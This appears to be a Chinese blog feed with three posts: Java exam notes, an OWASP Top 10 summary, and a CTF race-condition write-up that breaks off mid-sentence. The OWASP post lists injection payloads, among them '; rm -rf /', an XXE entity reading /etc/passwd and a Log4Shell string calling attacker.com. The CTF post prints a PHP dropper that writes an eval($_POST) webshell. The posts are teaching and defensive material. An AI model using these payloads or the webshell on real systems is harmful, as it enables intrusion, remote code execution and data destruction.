3</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="第三章-面向对象（核心！）"><a href="#第三章-面向对象（核心！）" class="headerlink" title="第三章 面向对象（核心！）"></a><strong>第三章 面向对象（核心！）</strong></h3><p><img src="/%5Cimages%5Cjava.png"></p><h4 id="1-基本概念（简答题）"><a href="#1-基本概念（简答题）" class="headerlink" title="1. 基本概念（简答题）"></a><strong>1. 基本概念</strong>（简答题）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;                 <span class="hljs-comment">// 类定义（类似Python class）</span><br>    String name;            <span class="hljs-comment">// 成员变量（属性）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String n)</span> &#123;  <span class="hljs-comment">// 构造方法（__init__）</span><br>        <span class="hljs-built_in">this</span>.name = n;      <span class="hljs-comment">// this指当前对象</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">bark</span><span class="hljs-params">()</span> &#123;           <span class="hljs-comment">// 成员方法</span><br>        System.out.println(name + <span class="hljs-string">&quot;汪汪！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 创建对象</span><br><span class="hljs-type">Dog</span> <span class="hljs-variable">myDog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;Buddy&quot;</span>);  <span class="hljs-comment">// new实例化（Python直接Dog()）</span><br>myDog.bark();  <span class="hljs-comment">// 调用方法</span><br></code></pre></td></tr></table></figure><h4 id="2-三大特性"><a href="#2-三大特性" class="headerlink" title="2. 三大特性"></a><strong>2. 三大特性</strong></h4><table><thead><tr><th>特性</th><th>Java实现</th><th>Python对比</th></tr></thead><tbody><tr><td><strong>封装</strong></td><td><code>private</code>&#x2F;<code>protected</code>&#x2F;<code>public</code></td><td>命名约定（_name）</td></tr><tr><td><strong>继承</strong></td><td><code>extends</code>（单继承）</td><td>多继承（MRO）</td></tr><tr><td><strong>多态</strong></td><td>父类引用指向子类对象 + 方法重写</td><td>Duck Typing</td></tr></tbody></table><p><strong>继承示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123; <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123; System.out.println(<span class="hljs-string">&quot;Eating...&quot;</span>); &#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;  <span class="hljs-comment">// 继承</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">// 方法重写（多态基础）</span><br>        System.out.println(<span class="hljs-string">&quot;Cat eats fish&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 多态应用</span><br><span class="hljs-type">Animal</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();  <span class="hljs-comment">// 父类引用指向子类对象</span><br>a.eat();  <span class="hljs-comment">// 输出&quot;Cat eats fish&quot;（动态绑定）</span><br></code></pre></td></tr></table></figure><h4 id="3-访问控制（单选题）"><a href="#3-访问控制（单选题）" class="headerlink" title="3. 访问控制（单选题）"></a><strong>3. 访问控制</strong>（单选题）</h4><table><thead><tr><th>修饰符</th><th>类内</th><th>同包</th><th>子类</th><th>其他包</th></tr></thead><tbody><tr><td><code>private</code></td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr><tr><td><code>protected</code></td><td>✅</td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><code>public</code></td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><hr><h3 id="第四章-高级特性（重点！）"><a href="#第四章-高级特性（重点！）" class="headerlink" title="第四章 高级特性（重点！）"></a><strong>第四章 高级特性（重点！）</strong></h3><p>只有static和final可组合在一起，而abstract和static一般不能组<br>合在一起。</p><p>• 接口与类的共同点：均可以实现类的继承。<br>• 接口与类的不同点：<br>（1）一个接口可由一个类或多个类来实现，一个类也可以实现<br>多个接口，从而具备多重继承的特性。但是一个类只能有一个直<br>接父类，没有多重继承的特性。<br>（2）接口中的所有方法均没有方法体，只有成员方法名，而类<br>要实现接口的话，必须实现接口里面的所有成员方法。<br>（3）一个类可以直接继承其父类的成员方法，不需要去实现方<br>法，也可以重载或者重写其父类的成员方法。</p><h4 id="1-关键字"><a href="#1-关键字" class="headerlink" title="1. 关键字"></a><strong>1. 关键字</strong></h4><table><thead><tr><th>关键字</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>abstract</code></td><td>抽象类&#x2F;方法（不能实例化）</td><td><code>abstract void draw();</code></td></tr><tr><td><code>static</code></td><td>类级别共享</td><td><code>static int count=0;</code></td></tr><tr><td><code>final</code></td><td>常量&#x2F;不可继承</td><td><code>final double PI=3.14;</code></td></tr><tr><td><code>this</code></td><td>当前对象引用</td><td><code>this.name = name;</code></td></tr></tbody></table><h4 id="2-接口-vs-抽象类（简答题）"><a href="#2-接口-vs-抽象类（简答题）" class="headerlink" title="2. 接口 vs 抽象类（简答题）"></a><strong>2. 接口 vs 抽象类</strong>（简答题）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> &#123;          <span class="hljs-comment">// 接口（100%抽象）</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>;              <span class="hljs-comment">// 默认public abstract</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Flyable</span> &#123;  <span class="hljs-comment">// 实现接口（多继承）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123; <br>        System.out.println(<span class="hljs-string">&quot;拍翅膀飞&quot;</span>); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-参数传递（程序填空）"><a href="#3-参数传递（程序填空）" class="headerlink" title="3. 参数传递（程序填空）"></a><strong>3. 参数传递</strong>（程序填空）</h4><ul><li><strong>基本类型</strong>：值传递（方法内修改不影响外部）</li><li><strong>引用类型</strong>：地址传递（方法内修改对象属性会影响外部）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> num, <span class="hljs-type">int</span>[] arr)</span> &#123;<br>    num = <span class="hljs-number">100</span>;         <span class="hljs-comment">// 不影响外部</span><br>    arr[<span class="hljs-number">0</span>] = <span class="hljs-number">99</span>;       <span class="hljs-comment">// 修改外部数组</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>change(x, a);<br>System.out.println(x); <span class="hljs-comment">// 输出10（未变）</span><br>System.out.println(a[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 输出99（已修改）</span><br></code></pre></td></tr></table></figure><hr><h3 id="第五章-数组、字符串、集合（重点！）"><a href="#第五章-数组、字符串、集合（重点！）" class="headerlink" title="第五章 数组、字符串、集合（重点！）"></a><strong>第五章 数组、字符串、集合（重点！）</strong></h3><h4 id="1-数组（程序填空）"><a href="#1-数组（程序填空）" class="headerlink" title="1. 数组（程序填空）"></a><strong>1. 数组</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;           <span class="hljs-comment">// 静态初始化</span><br><span class="hljs-type">int</span>[][] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];    <span class="hljs-comment">// 二维数组</span><br>arr2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>;                 <span class="hljs-comment">// 访问元素</span><br>System.out.println(arr1.length); <span class="hljs-comment">// 长度属性（非方法！）</span><br></code></pre></td></tr></table></figure><h4 id="2-字符串（高频考点！）"><a href="#2-字符串（高频考点！）" class="headerlink" title="2. 字符串（高频考点！）"></a><strong>2. 字符串</strong>（高频考点！）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-comment">// 常用方法（对比Python）</span><br>s1.concat(s2);      <span class="hljs-comment">// 拼接（Python: s1+s2）</span><br>s1.substring(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);  <span class="hljs-comment">// 切片&quot;el&quot;（Python: s1[1:3]）</span><br>s1.equals(s2);      <span class="hljs-comment">// 内容比较（==比较地址！）</span><br></code></pre></td></tr></table></figure><h4 id="3-集合类（程序填空）"><a href="#3-集合类（程序填空）" class="headerlink" title="3. 集合类（程序填空）"></a><strong>3. 集合类</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br>ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(); <span class="hljs-comment">// 泛型</span><br>list.add(<span class="hljs-string">&quot;A&quot;</span>);                     <span class="hljs-comment">// 添加元素</span><br>list.get(<span class="hljs-number">0</span>);                       <span class="hljs-comment">// 获取元素</span><br>list.size();                       <span class="hljs-comment">// 长度（Python: len()）</span><br><span class="hljs-comment">// Vector线程安全但效率低（用法类似）</span><br></code></pre></td></tr></table></figure><hr><h3 id="第六章-异常处理"><a href="#第六章-异常处理" class="headerlink" title="第六章 异常处理"></a><strong>第六章 异常处理</strong></h3><p>采用try-catch-finally结构：<br>（1）当try语句块中有抛出<br>（throw）异常时，则try语句块中<br>的剩余语句不执行。<br>（2）finally语句块一般都要执<br>行，除非try和catch语句块中有<br>System.exit(0)，则不执行finally语<br>句块，直接退出。<br>（3）当catch语句块能捕捉到<br>try语句块中抛出的异常，则try-<br>catch-finally结构之后的代码会被<br>执行，否则不会被执行。</p><hr><h3 id="第七章-文件与数据流"><a href="#第七章-文件与数据流" class="headerlink" title="第七章 文件与数据流"></a><strong>第七章 文件与数据流</strong></h3><h4 id="1-字节流（程序填空）"><a href="#1-字节流（程序填空）" class="headerlink" title="1. 字节流（程序填空）"></a><strong>1. 字节流</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 文件复制（模板代码！）</span><br><span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;in.jpg&quot;</span>);<br>     <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;out.jpg&quot;</span>)) &#123;<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>        fos.write(buffer, <span class="hljs-number">0</span>, len);  <span class="hljs-comment">// 缓冲区读写</span><br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-缓冲流（效率更高）"><a href="#2-缓冲流（效率更高）" class="headerlink" title="2. 缓冲流（效率更高）"></a><strong>2. 缓冲流</strong>（效率更高）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br><span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos);<br></code></pre></td></tr></table></figure><hr><h3 id="备考策略"><a href="#备考策略" class="headerlink" title="备考策略"></a><strong>备考策略</strong></h3><ol><li><p><strong>优先级排序</strong>：<br><strong>面向对象(30%) &gt; 集合&#x2F;字符串(25%) &gt; 异常&#x2F;流(15%) &gt; 基础语法(30%)</strong></p></li><li><p><strong>Python迁移技巧</strong>：</p><ul><li>Java的<code>ArrayList</code> ≈ Python的<code>list</code></li><li><code>String</code>方法名不同但功能类似（<code>.length()</code> vs <code>len()</code>）</li><li>OOP概念通用（封装、继承、多态）</li></ul></li><li><p><strong>刷题重点</strong>：</p><ul><li>程序填空题：循环&#x2F;数组&#x2F;字符串&#x2F;集合方法调用</li><li>简答题：OOP三大特性、接口vs抽象类</li><li>判断题：标识符规则、异常分类</li></ul></li></ol><blockquote><p>💡 <strong>最后叮嘱</strong>：虽然你精通算法，但Java考试更关注<strong>语法细节</strong>和<strong>API调用规范</strong>，务必多练手写代码！尤其注意分号、花括号、类型声明等Python没有的约束。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OWASP漏洞</title>
    <link href="/2025/06/16/OWASP%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/16/OWASP%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="owasp十大漏洞知识点"><a href="#owasp十大漏洞知识点" class="headerlink" title="owasp十大漏洞知识点"></a>owasp十大漏洞知识点</h1><hr><h3 id="1-注入（Injection）"><a href="#1-注入（Injection）" class="headerlink" title="1. 注入（Injection）"></a>1. <strong>注入（Injection）</strong></h3><ul><li><strong>原理</strong>：攻击者将恶意数据（如SQL、OS命令、NoQL）插入解释器中，欺骗解释器执行非预期命令。</li><li><strong>利用方式</strong>：<ul><li><strong>SQL注入</strong>：<code>&#39; OR &#39;1&#39;=&#39;1</code> 绕过登录；<code>UNION SELECT</code> 窃取数据。</li><li><strong>命令注入</strong>：<code>; rm -rf /</code> 在参数中拼接系统命令。</li><li><strong>NoSQL注入</strong>：<code>&#123;&quot;$ne&quot;: &quot;1&quot;&#125;</code> 绕过MongoDB查询。</li></ul></li><li><strong>防御</strong>：参数化查询（Prepared Statements）、输入验证、ORM框架、最小权限原则。</li></ul><hr><h3 id="2-失效的身份认证（Broken-Authentication）"><a href="#2-失效的身份认证（Broken-Authentication）" class="headerlink" title="2. 失效的身份认证（Broken Authentication）"></a>2. <strong>失效的身份认证（Broken Authentication）</strong></h3><ul><li><strong>原理</strong>：身份验证或会话管理机制存在缺陷，导致账户被接管。</li><li><strong>利用方式</strong>：<ul><li>暴力破解弱密码（如<code>admin/password</code>）。</li><li>窃取Session ID（XSS、网络嗅探）。</li><li>滥用密码重置逻辑（如未验证邮箱所有权）。</li></ul></li><li><strong>防御</strong>：多因素认证（MFA）、强密码策略、安全存储Session、HTTPS加密。</li></ul><hr><h3 id="3-敏感数据泄露（Sensitive-Data-Exposure）"><a href="#3-敏感数据泄露（Sensitive-Data-Exposure）" class="headerlink" title="3. 敏感数据泄露（Sensitive Data Exposure）"></a>3. <strong>敏感数据泄露（Sensitive Data Exposure）</strong></h3><ul><li><strong>原理</strong>：未加密或弱加密保护敏感数据（密码、信用卡号）。</li><li><strong>利用方式</strong>：<ul><li>窃取未加密的传输数据（中间人攻击）。</li><li>获取备份数据库（如AWS S3公开访问）。</li></ul></li><li><strong>防御</strong>：TLS加密传输、静态数据加密（AES-256）、禁用缓存敏感数据、密钥管理。</li></ul><hr><h3 id="4-XML外部实体（XXE）"><a href="#4-XML外部实体（XXE）" class="headerlink" title="4. XML外部实体（XXE）"></a>4. <strong>XML外部实体（XXE）</strong></h3><ul><li><strong>原理</strong>：解析恶意XML时，引用外部实体导致文件读取&#x2F;SSRF。</li><li><strong>利用方式</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>读取服务器文件或发起内网请求。</li><li><strong>防御</strong>：禁用DTD&#x2F;外部实体（如<code>libxml_disable_entity_loader</code>）、使用JSON替代XML。</li></ul><hr><h3 id="5-失效的访问控制（Broken-Access-Control）"><a href="#5-失效的访问控制（Broken-Access-Control）" class="headerlink" title="5. 失效的访问控制（Broken Access Control）"></a>5. <strong>失效的访问控制（Broken Access Control）</strong></h3><ul><li><strong>原理</strong>：未对用户权限进行校验，允许越权操作。</li><li><strong>利用方式</strong>：<ul><li>修改URL参数（如<code>/user?id=123</code> → <code>id=124</code>）访问他人数据。</li><li>未授权访问管理接口（如<code>/admin</code> 无鉴权）。</li></ul></li><li><strong>防御</strong>：RBAC权限模型、服务端校验所有权、默认拒绝原则。</li></ul><hr><h3 id="6-安全配置错误（Security-Misconfiguration）"><a href="#6-安全配置错误（Security-Misconfiguration）" class="headerlink" title="6. 安全配置错误（Security Misconfiguration）"></a>6. <strong>安全配置错误（Security Misconfiguration）</strong></h3><ul><li><strong>原理</strong>：默认配置、冗余功能、错误HTTP头导致暴露漏洞。</li><li><strong>利用方式</strong>：<ul><li>访问未删除的调试页面（如<code>/phpinfo.php</code>）。</li><li>利用默认密码登录（Tomcat <code>admin:admin</code>）。</li></ul></li><li><strong>防御</strong>：最小化安装、定期扫描配置、自动化部署（如Ansible）、禁用目录列表。</li></ul><hr><h3 id="7-跨站脚本（XSS）"><a href="#7-跨站脚本（XSS）" class="headerlink" title="7. 跨站脚本（XSS）"></a>7. <strong>跨站脚本（XSS）</strong></h3><ul><li><strong>原理</strong>：恶意脚本注入到网页中，在用户浏览器执行。</li><li><strong>类型与利用</strong>：<ul><li><strong>反射型XSS</strong>：通过钓鱼链接传播（<code>http://site.com?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>）。</li><li><strong>存储型XSS</strong>：恶意评论存入数据库，所有用户加载时触发。</li><li><strong>DOM型XSS</strong>：前端JS操作DOM时未转义（如<code>document.write(location.hash)</code>）。</li></ul></li><li><strong>防御</strong>：输出编码（HTML&#x2F;JS&#x2F;CSS）、CSP策略、输入验证、<code>HttpOnly</code> Cookie。</li></ul><hr><h3 id="8-不安全的反序列化（Insecure-Deserialization）"><a href="#8-不安全的反序列化（Insecure-Deserialization）" class="headerlink" title="8. 不安全的反序列化（Insecure Deserialization）"></a>8. <strong>不安全的反序列化（Insecure Deserialization）</strong></h3><ul><li><strong>原理</strong>：反序列化恶意数据导致远程代码执行（RCE）或权限提升。</li><li><strong>利用方式</strong>：<ul><li>Java反序列化漏洞（如Apache Commons Collections）。</li><li>篡改Cookie中的序列化对象提升权限。</li></ul></li><li><strong>防御</strong>：避免反序列化用户输入、使用JSON、签名验证数据完整性。</li></ul><hr><h3 id="9-使用含已知漏洞的组件（Vulnerable-Components）"><a href="#9-使用含已知漏洞的组件（Vulnerable-Components）" class="headerlink" title="9. 使用含已知漏洞的组件（Vulnerable Components）"></a>9. <strong>使用含已知漏洞的组件（Vulnerable Components）</strong></h3><ul><li><strong>原理</strong>：第三方库（如Log4j、Struts）存在公开漏洞。</li><li><strong>利用方式</strong>：<ul><li>CVE-2021-44228（Log4Shell）：<code>$&#123;jndi:ldap://attacker.com/exp&#125;</code> 触发RCE。</li></ul></li><li><strong>防御</strong>：依赖扫描工具（OWASP Dependency-Check）、定期更新、移除无用依赖。</li></ul><hr><h3 id="10-日志与监控不足（Insufficient-Logging-Monitoring）"><a href="#10-日志与监控不足（Insufficient-Logging-Monitoring）" class="headerlink" title="10. 日志与监控不足（Insufficient Logging &amp; Monitoring）"></a>10. <strong>日志与监控不足（Insufficient Logging &amp; Monitoring）</strong></h3><ul><li><strong>原理</strong>：未记录关键事件（登录失败、异常请求），导致攻击无法追溯。</li><li><strong>利用方式</strong>：攻击者横向移动而不触发告警（如数据窃取数月未被发现）。</li><li><strong>防御</strong>：集中化日志（ELK&#x2F;Splunk）、实时监控、设置告警阈值（如5分钟内20次登录失败）。</li></ul><hr><h3 id="关键防御策略"><a href="#关键防御策略" class="headerlink" title="关键防御策略"></a>关键防御策略</h3><ol><li><strong>纵深防御</strong>：多层安全措施（WAF+输入校验+编码+最小权限）。</li><li><strong>自动化工具</strong>：SAST&#x2F;DAST扫描（如ZAP、Burp Suite）、依赖检查。</li><li><strong>安全意识</strong>：开发人员安全培训（如安全编码规范）。</li><li><strong>威胁建模</strong>：设计阶段识别潜在风险（如STRIDE模型）。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF条件竞争漏洞</title>
    <link href="/2025/06/12/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2025/06/12/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<p><strong>条件竞争</strong>指的是程序的<strong>执行结果依赖于不受控制的事件发生的顺序或时机</strong>。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。</p><h2 id="核心原理："><a href="#核心原理：" class="headerlink" title="核心原理："></a>核心原理：</h2><ol><li><p><strong>共享资源：</strong> 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个<strong>临时文件</strong>、一个状态标志、一个数据库字段、一个计数器）。</p></li><li><p><strong>非原子操作：</strong> 对共享资源的操作不是“原子性”的。这意味着完成操作需要多个步骤，在这些步骤之间可以被中断，让其他请求介入。</p></li><li><p><strong>并发访问：</strong> 攻击者能够以极高的并发度（同时或极短时间内）发送多个请求，试图让这些请求的执行流在操作共享资源的关键步骤上相互交织。</p></li><li><p><strong>非预期交织：</strong> 由于请求的执行顺序和时机不确定，攻击者精心构造的并发请求可能导致操作步骤以开发者未预料到的顺序执行。</p></li><li><p><strong>利用结果：</strong> 这种非预期的执行顺序导致程序进入一个非预期的、通常是有利于攻击者的状态（例如：绕过检查、创建非预期文件、提升权限）。</p></li></ol><hr><h2 id="文件上传-解析-执行-经典案例"><a href="#文件上传-解析-执行-经典案例" class="headerlink" title="文件上传 + 解析&#x2F;执行 (经典案例):"></a>文件上传 + 解析&#x2F;执行 (经典案例):</h2><ul><li><strong>场景：</strong> 服务器允许用户上传文件。上传后，服务器会对文件进行一些检查（如检查文件类型、内容），如果检查通过，会将文件移动到一个有执行权限的目录（如 <code>uploads/</code>）；如果检查不通过，会删除该临时文件。</li><li><strong>漏洞：</strong> 检查(<code>check</code>)和移动(<code>move</code>)是两个独立的操作，不是原子的。在<code>check</code>完成之后、<code>move</code>执行之前，存在一个非常短暂的时间窗口。</li><li><strong>攻击：</strong><ol><li>攻击者不断快速上传一个包含恶意代码（如 Webshell）的文件 <code>shell.php</code>。</li><li>服务器收到上传后，将文件保存为一个<strong>临时文件名</strong>（如 <code>/tmp/tmp_upload_12345</code>）。</li><li>服务器开始对这个临时文件进行检查。</li><li>在检查<strong>完成之后</strong>（假设检查逻辑有漏洞被绕过，或者攻击者利用速度制造混乱），但在服务器将其<strong>移动到最终目录之前</strong>（例如 <code>uploads/shell.php</code>），攻击者以极高的并发度疯狂访问这个<strong>临时文件</strong>对应的最终预期URL（如 <code>http://target/uploads/shell.php</code>）。</li><li>由于访问请求极快且大量，<strong>有可能</strong>在某个时刻，服务器刚刚完成检查认为文件合法，<strong>还没来得及移动文件</strong>，就有一个访问请求到达了Web服务器（如 Apache&#x2F;Nginx）。</li><li>Web服务器尝试去 <code>uploads/</code> 目录下寻找 <code>shell.php</code>，但此时文件还在 <code>/tmp/tmp_upload_12345</code>，所以没找到，返回404。</li><li><strong>但是！</strong> 如果攻击者的访问请求在服务器将临时文件移动到 <code>uploads/shell.php</code> <strong>之后</strong>才被Web服务器处理，那么Web服务器就能找到并执行这个 <code>shell.php</code> 文件，攻击者的恶意代码就执行成功了！</li></ol></li><li><strong>关键：</strong> 攻击者通过海量的并发访问，赌那个“移动文件刚刚完成，访问请求就到达”的时机。虽然单个请求命中的概率很低，但海量请求下总有一次会成功。成功执行后，攻击者就获得了Webshell。</li></ul><hr><h2 id="购买-兑换逻辑（有限资源或支付校验）："><a href="#购买-兑换逻辑（有限资源或支付校验）：" class="headerlink" title="购买&#x2F;兑换逻辑（有限资源或支付校验）："></a>购买&#x2F;兑换逻辑（有限资源或支付校验）：</h2><ul><li><strong>场景：</strong> 用户用积分购买商品或兑换优惠券。流程是：1) 检查用户积分是否足够； 2) 如果足够，则扣除积分； 3) 发放商品&#x2F;优惠券。</li><li><strong>漏洞：</strong> “检查积分”和“扣除积分”不是原子操作。</li><li><strong>攻击：</strong><ol><li>攻击者账户只有够买1件商品的积分。</li><li>攻击者同时发送大量购买请求（比如100个）。</li><li>服务器在处理第一个请求时，检查积分（足够） -&gt; 扣除积分（变为0） -&gt; 发放商品。</li><li>但在处理后续的99个请求时，因为它们几乎是<strong>同时</strong>到达，服务器在<strong>扣除积分之前</strong>检查积分，看到的都是<strong>原始的、足够的积分</strong>（因为第一个请求的扣除操作可能还没写入数据库，或者读到了旧缓存）。于是服务器认为积分足够，继续执行扣除和发放操作。</li><li>结果：攻击者用仅够买1件商品的积分，成功购买了100件商品。服务器积分被扣成负数，或者错误地发放了大量优惠券&#x2F;商品。</li></ol></li></ul><hr><h2 id="攻击代码（假设文件名为-shell-php）："><a href="#攻击代码（假设文件名为-shell-php）：" class="headerlink" title="攻击代码（假设文件名为 shell.php）："></a>攻击代码（假设文件名为 shell.php）：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;my.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php eval($_POST[my]);?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>代码解析</strong>：</p><ol><li><strong><code>fopen(&quot;my.php&quot;, &quot;w&quot;)</code></strong>  <ul><li>以<strong>写入模式</strong>打开当前目录下的 <code>my.php</code> 文件（不存在则创建）。</li></ul></li><li><strong><code>fputs(..., &#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></strong>  <ul><li>向 <code>my.php</code> 写入内容：<code>&lt;?php eval($_POST[my]);?&gt;</code>  </li><li><code>eval($_POST[my])</code> 表示执行通过POST参数 <code>my</code> 传递的任意代码（例如 <code>my=system(&quot;ls&quot;)</code> 可执行系统命令）。</li></ul></li><li><strong>整体作用</strong><br><strong>当此文件被PHP解析执行时，会在当前目录生成一个恶意Webshell文件 <code>my.php</code></strong>，攻击者通过访问 <code>my.php</code> 